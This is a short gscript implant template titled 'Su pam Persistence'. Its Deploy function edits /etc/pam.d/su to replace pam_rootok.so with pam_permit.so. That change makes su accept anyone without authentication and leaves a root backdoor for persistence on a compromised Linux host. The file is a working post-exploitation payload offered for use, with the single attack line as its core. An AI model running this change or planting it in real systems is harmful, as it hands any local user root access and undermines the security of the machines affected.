// Example gscript template
// Title: Su pam Persistence
// Author: ahhh
// Purpose: replaces the pam directive for the root user w/ on that just auths succesful
// Gscript version: 1.0.0
// ATT&CK: 
// Note: must run implant as root

//priority:100
//timeout:150

function Deploy() {  
    console.log("starting execution of Su Persistence");

    var replaceError = G.file.ReplaceInFileWithString("/etc/pam.d/su", "pam_rootok.so", "pam_permit.so");
    console.log("errors: "+ replaceError);

    console.log("done Su Persistence");
    return true; 
  }
